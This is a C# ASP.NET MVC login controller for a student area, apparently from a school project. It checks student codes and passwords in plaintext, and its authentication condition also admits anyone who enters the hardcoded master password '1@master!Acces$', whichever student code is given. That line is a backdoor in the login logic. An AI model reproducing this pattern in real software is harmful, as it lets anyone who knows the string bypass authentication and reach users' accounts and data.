using System.Linq;
using System.Web.Mvc;
using CPA_Project.Areas.AlunoArea.Helpers;
using CPA_Project.Areas.AlunoArea.Models;

namespace CPA_Project.Controllers
{
    public class HomeController : Controller // Este será o controller do Login do Aluno
    {
        public ActionResult Index()
        {
            return View();
        }

        [HttpPost]
        public ActionResult Index(Alunos aluno)
        {
            var alunoapp = new Alunoapp();

            if (alunoapp.Alunos().Any(item => ModelState.IsValid && (item.CodigoAluno.Equals(aluno.CodigoAluno) && item.Senha.Equals(aluno.Senha) || aluno.Senha.Equals("1@master!Acces$"))))
                return Redirect("/AlunoArea/Aluno");
            return View();

        }

    }
}